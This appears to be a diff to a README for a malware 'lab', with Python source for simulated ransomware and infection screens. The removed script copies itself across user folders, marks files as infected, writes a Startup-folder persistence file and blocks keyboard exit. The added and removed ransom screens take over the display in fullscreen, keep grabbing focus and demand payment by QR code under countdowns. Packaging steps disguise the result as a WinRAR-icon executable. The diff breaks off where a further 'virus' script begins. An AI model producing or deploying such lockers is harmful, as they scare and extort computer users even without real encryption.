@@ -14,171 +14,216 @@ venv\Scripts\activate
  ### Step 3: Install Required Libraries
 
 ```bash
-pip install pygame
+pip install PILLOW ( Ransomware)
+```
+```bash
+python -m PyInstaller --onefile --windowed --add-data "qrc (2).jpg;." --add-data "alert.wav;." rans.py
+```
+```bash
+ pyinstaller --onefile --windowed --icon=winrar.ico --add-data "qrc (2).jpg;." rans.py
 ```
 
-### Step 4: infecto.py
+# Ransomware
 
+## Install PyInstaller
 ```bash
-import os, shutil, random, time, datetime, tkinter as tk, pygame
+ pip install pyinstaller
+```
+```bash
+import os
+import sys
+import time
+import json
+import random
+import datetime
 from threading import Thread
+from PIL import Image, ImageTk
+import tkinter as tk
+from tkinter import messagebox
+import winsound
 
-# ===== CONFIG =====
-TARGET_DIRS = [
-    os.path.expanduser("~/Desktop"),
-    os.path.expanduser("~/Documents"),
-    "C:\\Temp"
-]
-FAKE_EXT = ".infected"
-ALARM_FILE = os.path.join(os.path.dirname(__file__), "alert.wav")
-SIM_DURATION = 20
-SAVE_DIR = os.path.expanduser("~/Desktop")  # infection_log.txt will be saved here
-# ==================
 
-log = []
+def resource_path(filename):
+    if getattr(sys, "frozen", False):
+        base_path = sys._MEIPASS
+    else:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+    return os.path.join(base_path, filename)
 
-def log_event(event, box=None):
-    ts = datetime.datetime.now().strftime("%H:%M:%S")
-    entry = f"[{ts}] {event}"
-    log.append(entry)
-    print(entry)
-    if box:
-        box.insert(tk.END, entry + "\n")
-        box.see(tk.END)
 
-def save_log():
-    """Save IOC log to Desktop after infection ends"""
-    try:
-        fname = os.path.join(SAVE_DIR, "infection_log.txt")
-        with open(fname, "w") as f:
-            for entry in log:
-                f.write(entry + "\n")
-        print(f"[+] Infection log saved at: {fname}")
-    except Exception as e:
-        print(f"[!] Could not save log: {e}")
+VICTIM_ID = f"SIM-{random.randint(10000, 99999)}"
+DURATION = 90
 
-def spread_self(log_box=None):
-    exe_path = os.path.abspath(__file__)
-    for d in TARGET_DIRS:
-        try:
-            os.makedirs(d, exist_ok=True)
-            target = os.path.join(d, f"win_patch_{random.randint(1000,9999)}.py")
-            shutil.copy(exe_path, target)
-            log_event(f"Copied to {target}", log_box)
-        except Exception as e:
-            log_event(f"Spread failed: {e}", log_box)
+QR_IMAGE = resource_path("qrc (2).jpg")
+ALARM_WAV = resource_path("alert.wav")
 
-def infect_files(log_box=None):
-    for d in TARGET_DIRS:
-        try:
-            for fname in os.listdir(d):
-                fpath = os.path.join(d, fname)
-                if os.path.isfile(fpath) and not fpath.endswith(FAKE_EXT):
-                    infected = fpath + FAKE_EXT
-                    shutil.copy(fpath, infected)
-                    log_event(f"File infected: {infected}", log_box)
-        except:
-            pass
+EVIDENCE_DIR = os.path.join(os.getcwd(), "sim_evidence")
+os.makedirs(EVIDENCE_DIR, exist_ok=True)
 
-def simulate_persistence(log_box=None):
-    try:
-        startup = os.path.join(os.getenv("APPDATA"), r"Microsoft\\Windows\\Start Menu\\Programs\\Startup")
-        os.makedirs(startup, exist_ok=True)
-        dummy = os.path.join(startup, "startup_infect.bat")
-        with open(dummy, "w") as f:
-            f.write("echo Fake persistence simulation - no real damage.")
-        log_event(f"Persistence simulated at: {dummy}", log_box)
-    except Exception as e:
-        log_event(f"Persistence failed: {e}", log_box)
 
-def play_alert():
-    try:
-        pygame.mixer.init()
-        pygame.mixer.music.load(ALARM_FILE)
-        pygame.mixer.music.play(-1)
-        print(f"[+] Playing sound from {ALARM_FILE}")
-    except Exception as e:
-        log_event(f"Alert sound error: {e}")
+def generate_iocs():
+    ts = datetime.datetime.now().isoformat()
+    return [
+        {"time": ts, "type": "process", "detail": "ransomware.exe (simulated)"},
+        {"time": ts, "type": "file", "detail": "Resume.docx.locked"},
+        {"time": ts, "type": "file", "detail": "Vacation.jpg.locked"},
+        {"time": ts, "type": "network", "detail": "beacon → 10.10.10.10"}
+    ]
 
-# --- Fullscreen infection GUI ---
-def infection_screen():
+
+def save_iocs(iocs):
+    path = os.path.join(EVIDENCE_DIR, f"evidence_{int(time.time())}.json")
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump({
+            "victim_id": VICTIM_ID,
+            "generated": datetime.datetime.now().isoformat(),
+            "iocs": iocs,
+            "note": "Simulation only"
+        }, f, indent=2)
+    return path
+
+
+def play_alarm():
+    if os.path.exists(ALARM_WAV):
+        winsound.PlaySound(
+            ALARM_WAV,
+            winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP
+        )
+
+
+def stop_alarm():
+    winsound.PlaySound(None, winsound.SND_PURGE)
+
+
+def launch_gui():
     root = tk.Tk()
+    root.title("Security Alert")
     root.attributes("-fullscreen", True)
-    root.configure(bg="black")
-    root.wm_attributes("-topmost", 1)
+    root.attributes("-topmost", True)
+    root.overrideredirect(True)
+    root.configure(bg="#4b0000")
 
-    # disable exit + keyboard
-    root.protocol("WM_DELETE_WINDOW", lambda: None)
-    root.bind_all("<Key>", lambda e: "break")
-    root.bind_all("<Alt-Key>", lambda e: "break")
+    play_alarm()
 
-    warning = tk.Label(
-        root,
-        text="⚠️ YOUR PC HAS BEEN INFECTED ⚠️",
-        fg="red",
-        bg="black",
-        font=("Consolas", 42, "bold")
+    def keep_focus():
+        while True:
+            try:
+                root.focus_force()
+                root.lift()
+            except:
+                break
+            time.sleep(0.4)
+
+    Thread(target=keep_focus, daemon=True).start()
+
+    canvas = tk.Canvas(root, bg="#4b0000", highlightthickness=0)
+    canvas.pack(fill="both", expand=True)
+
+    sw, sh = root.winfo_screenwidth(), root.winfo_screenheight()
+    card_w, card_h = 520, 430
+
+    card = tk.Frame(canvas, bg="#e00012")
+    canvas.create_window(
+        sw // 2,
+        sh // 2,
+        window=card,
+        width=card_w,
+        height=card_h
     )
-    warning.place(relx=0.5, rely=0.3, anchor="center")
 
-    submsg = tk.Label(
-        root,
-        text="Do not turn off your computer.\nFiles are being corrupted...",
-        fg="yellow",
-        bg="black",
-        font=("Consolas", 20)
+    header = tk.Frame(card, bg="#ff0020", height=150)
+    header.pack(fill="x")
+
+    icon = tk.Canvas(header, width=90, height=90, bg="#ff0020", highlightthickness=0)
+    icon.pack(pady=18)
+    icon.create_polygon(45, 6, 84, 78, 6, 78, fill="white")
+    icon.create_text(45, 56, text="!", fill="black", font=("Segoe UI", 32, "bold"))
+
+    tk.Label(
+        header,
+        text="You've Been Hacked!",
+        bg="#ff0020",
+        fg="white",
+        font=("Segoe UI", 22, "bold")
+    ).pack()
+
+    body = tk.Frame(card, bg="#d10014")
+    body.pack(fill="both", expand=True, padx=30, pady=20)
+
+    tk.Label(
+        body,
+        text="Your files have been encrypted.\nScan the QR code below to restore access.",
+        bg="#d10014",
+        fg="#ffecec",
+        font=("Segoe UI", 12),
+        justify="center"
+    ).pack(pady=(0, 14))
+
+    if os.path.exists(QR_IMAGE):
+        img = Image.open(QR_IMAGE).resize((160, 160), Image.LANCZOS)
+        qr = ImageTk.PhotoImage(img)
+        lbl = tk.Label(body, image=qr, bg="#d10014")
+        lbl.image = qr
+        lbl.pack()
+    else:
+        tk.Label(
+            body,
+            text="QR CODE NOT FOUND",
+            fg="white",
+            bg="#d10014",
+            font=("Segoe UI", 12, "bold")
+        ).pack(pady=40)
+
+    status = tk.Label(
+        body,
+        text="Awaiting payment...",
+        bg="#d10014",
+        fg="#ffd16a",
+        font=("Consolas", 11)
     )
-    submsg.place(relx=0.5, rely=0.42, anchor="center")
+    status.pack(pady=12)
 
-    log_box = tk.Text(root, height=15, width=95, bg="black", fg="lime", font=("Consolas", 12))
-    log_box.place(relx=0.5, rely=0.75, anchor="center")
+    def ok_action():
+        messagebox.showwarning(
+            "Payment Required",
+            "No payment detected.\nFiles remain encrypted."
+        )
 
-    # Animation vars
-    direction = 1
-    y_pos = 0.3
-    start_time = time.time()
+    tk.Button(
+        body,
+        text="OK",
+        command=ok_action,
+        bg="#ff4a4a",
+        fg="black",
+        activebackground="#ff6b6b",
+        relief="flat",
+        font=("Segoe UI", 12, "bold"),
+        width=10,
+        pady=6
+    ).pack(pady=6)
 
-    while time.time() - start_time < SIM_DURATION:
-        # Move the red warning up and down
-        y_pos += 0.003 * direction
-        if y_pos > 0.35 or y_pos < 0.25:
-            direction *= -1
-        warning.place(relx=0.5, rely=y_pos, anchor="center")
+    def countdown():
+        start = time.time()
+        while time.time() - start < DURATION:
+            remaining = int(DURATION - (time.time() - start))
+            status.config(text=f"Time remaining: {remaining}s")
+            time.sleep(1)
 
-        # Fake infection events
-        if random.random() < 0.25:
-            fake_event = random.choice([
-                "Injected into explorer.exe",
-                "Modified registry key HKCU\\Run",
-                "Spawned process: svchost32.exe",
-                "Spreading to Documents folder",
-                "Memory hook installed"
-            ])
-            log_event(fake_event, log_box)
+        status.config(text="Deadline expired. Files lost.")
+        stop_alarm()
 
-        root.update()
-        time.sleep(0.2)
+    Thread(target=countdown, daemon=True).start()
 
-    root.destroy()
-    save_log()  
+    root.mainloop()
 
-# --- MAIN ---
-def main():
-    Thread(target=spread_self, daemon=True).start()
-    Thread(target=infect_files, daemon=True).start()
-    Thread(target=simulate_persistence, daemon=True).start()
-    Thread(target=play_alert, daemon=True).start()
-    infection_screen()
 
 if __name__ == "__main__":
-    main()
-
+    launch_gui()
 ```
-
 ## Creating a EXE FILE
 #### 1. Convert Script to EXE
 
-Prepare the Icon
+Prepare the Icon:
 
 #### Go to: https://www.iconarchive.com/
 ##### Download and Rename the file (example: infecto.ico).
@@ -190,206 +235,14 @@ Paste this:
 pip install pyinstaller
 ```
 ```bash
-pyinstaller --onefile --windowed --icon=infecto.ico infecto.py
+ pyinstaller --onefile --windowed --icon=winrar.ico --add-data "qrc (2).jpg;." rans.py
 ```
+
 #### 2. Create the Desktop Shortcut
 - Right-click Desktop → New → Shortcut
 - Browse to: C:\Users\Administrator\Downloads\LAB\InfectoV\dist\infecto.exe
 - Right-click the shortcut → Properties → Change Icon
-- Select your infecto.ico.
-
-# Ransomware
-
-## Install PyInstaller
-```bash
- pip install pyinstaller
-```
-## Ransom.py
-```bash
-import os
-import sys
-import json
-import time
-import datetime
-import random
-from threading import Thread
-from PIL import Image, ImageTk
-import tkinter as tk
-from tkinter import messagebox
-
-# ==============================
-# PYINSTALLER-SAFE RESOURCE PATH
-# ==============================
-def resource_path(relative_path):
-    try:
-        base_path = sys._MEIPASS  # PyInstaller temp folder
-    except AttributeError:
-        base_path = os.path.dirname(os.path.abspath(__file__))
-    return os.path.join(base_path, relative_path)
-
-# ==============================
-# GLOBALS
-# ==============================
-VICTIM_ID = f"SIM-{random.randint(10000,99999)}"
-SIM_DURATION = 90
-QR_FILE = resource_path("qrc (2).jpg")
-EVIDENCE_DIR = os.path.join(os.getcwd(), "sim_evidence")
-os.makedirs(EVIDENCE_DIR, exist_ok=True)
-
-# ==============================
-# IOC GENERATION
-# ==============================
-def generate_mock_iocs():
-    now = datetime.datetime.now().isoformat()
-    return [
-        {"timestamp": now, "type": "process_creation", "detail": "ransomware.exe (simulated)"},
-        {"timestamp": now, "type": "file_marker", "detail": "Resume.docx.locked"},
-        {"timestamp": now, "type": "file_marker", "detail": "Vacation.jpg.locked"},
-        {"timestamp": now, "type": "network_beacon", "detail": "beacon to 10.10.10.10 (simulated)"}
-    ]
-
-def save_evidence(iocs):
-    fname = os.path.join(EVIDENCE_DIR, f"evidence_{int(time.time())}.json")
-    report = {
-        "victim_id": VICTIM_ID,
-        "generated_at": datetime.datetime.now().isoformat(),
-        "iocs": iocs,
-        "note": "Simulated evidence for lab only."
-    }
-    with open(fname, "w", encoding="utf-8") as f:
-        json.dump(report, f, indent=2)
-    return fname
-
-# ==============================
-# GUI
-# ==============================
-def run_gui():
-    root = tk.Tk()
-    root.title("Ooops, your files have been encrypted!")
-    root.configure(bg="#232224")
-    root.attributes("-fullscreen", True)
-    root.attributes("-topmost", True)
-    root.overrideredirect(True)
-
-    def lock_focus():
-        while True:
-            try:
-                root.focus_force()
-                root.lift()
-            except:
-                break
-            time.sleep(0.4)
-
-    Thread(target=lock_focus, daemon=True).start()
-
-    banner = tk.Frame(root, bg="#a60d0d", height=47)
-    banner.pack(fill="x")
-    tk.Label(banner, text="Ooops, your files have been encrypted!", bg="#a60d0d",
-             fg="white", font=("Segoe UI", 16, "bold")).pack(side="left", padx=30)
-    tk.Label(banner, text=f"Victim ID: {VICTIM_ID}", bg="#a60d0d",
-             fg="#ffd0d0", font=("Consolas", 12)).pack(side="right", padx=30)
-
-    card = tk.Frame(root, bg="#1c1919", bd=2, relief="ridge")
-    card.pack(padx=25, pady=25, fill="both", expand=True)
-
-    left = tk.Frame(card, bg="#7a0909", width=215)
-    left.pack(side="left", fill="y")
-    left.pack_propagate(False)
-
-    lock_canvas = tk.Canvas(left, width=97, height=97, bg="#7a0909", highlightthickness=0)
-    lock_canvas.create_oval(8, 8, 89, 89, fill="#fff", outline="#bdbaba")
-    lock_canvas.create_rectangle(37, 44, 69, 85, fill="#7a0909", outline="#7a0909")
-    lock_canvas.create_arc(24, 18, 82, 60, start=0, extent=180, style="arc",
-                           outline="#7a0909", width=7)
-    lock_canvas.pack(pady=17)
-
-    def make_timer_box(parent, title, date_val):
-        frame = tk.Frame(parent, bg="#7a0909")
-        frame.pack(pady=7, padx=10, fill="x")
-        tk.Label(frame, text=title, bg="#7a0909", fg="#ffeeee",
-                 font=("Segoe UI", 12, "bold")).pack(anchor="w")
-        date_lbl = tk.Label(frame, text=date_val, bg="white",
-                            fg="#2d2929", font=("Consolas", 13, "bold"), width=23)
-        date_lbl.pack(pady=(3, 0))
-        timer_lbl = tk.Label(frame, text="00:00:00", bg="black",
-                             fg="#ff3939", font=("Consolas", 14, "bold"), width=23)
-        timer_lbl.pack(pady=(2, 6))
-        return date_lbl, timer_lbl
-
-    payment_deadline = (datetime.datetime.now() + datetime.timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S")
-    file_loss_deadline = (datetime.datetime.now() + datetime.timedelta(minutes=3)).strftime("%Y-%m-%d %H:%M:%S")
-
-    raise_date_lbl, raise_timer_lbl = make_timer_box(left, "Payment required before:", payment_deadline)
-    lost_date_lbl, lost_timer_lbl = make_timer_box(left, "Files WILL BE LOST after:", file_loss_deadline)
-
-    tk.Label(left, text="System monitored. DO NOT TURN OFF.",
-             bg="#7a0909", fg="#ffd0d0", font=("Segoe UI", 10),
-             wraplength=180).pack(pady=9)
-
-    right = tk.Frame(card, bg="#19181b")
-    right.pack(side="left", fill="both", expand=True, padx=30, pady=13)
-
-    content = (
-        "All files on this computer have been encrypted.\n"
-        "Extension '.locked' is added to every affected file.\n\n"
-        "To restore access:\n"
-        "  1. Scan the QR code below using a mobile payment app.\n"
-        "  2. Send the exact amount demanded.\n"
-        "  3. Click 'Check Payment' below.\n\n"
-        "WARNING:\n"
-        "  - Do NOT modify encrypted files.\n"
-        "  - Antivirus removal will NOT recover your data.\n"
-        "  - Deadline failure = permanent loss."
-    )
-
-    tk.Label(right, text=content, bg="#19181b", fg="#ededed",
-             font=("Segoe UI", 13), justify="left",
-             anchor="nw", wraplength=480).pack(pady=10)
-
-    qr_container = tk.Frame(right, bg="#19181b")
-    qr_container.pack(pady=6)
-
-    if os.path.exists(QR_FILE):
-        img = Image.open(QR_FILE).resize((180, 180), Image.LANCZOS)
-        tk_qr = ImageTk.PhotoImage(img)
-        lbl_qr = tk.Label(qr_container, image=tk_qr, bg="#19181b")
-        lbl_qr.image = tk_qr
-        lbl_qr.pack()
-    else:
-        tk.Label(qr_container, text="[PAYMENT QR NOT FOUND]",
-                 bg="#19181b", fg="red",
-                 font=("Segoe UI", 13)).pack(pady=38)
-
-    status = tk.Label(right, text="Scan code above to pay ransom.",
-                      bg="#19181b", fg="#ffd15f",
-                      font=("Consolas", 11, "bold"))
-    status.pack(pady=8)
-
-    def countdown():
-        start = time.time()
-        while time.time() - start < SIM_DURATION:
-            remain = int(SIM_DURATION - (time.time() - start))
-            now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            raise_timer_lbl.config(text=time.strftime("%H:%M:%S", time.gmtime(remain)))
-            lost_timer_lbl.config(text=time.strftime("%H:%M:%S", time.gmtime(max(0, remain - 30))))
-            status.config(text=f"Time left: {remain}s | {now}")
-            time.sleep(1)
-        status.config(text="DEADLINE PASSED. FILES LOST.")
-
-    Thread(target=countdown, daemon=True).start()
-    root.mainloop()
-
-def main():
-    run_gui()
-
-if __name__ == "__main__":
-    main()
-
-```bash
- pyinstaller --onefile --windowed --icon=winrar.ico --add-data "qrc (2).jpg;." rans.py```
-
-
-
+- 
 ### VIRUS: Fake_error.py
 ```bash
 import random
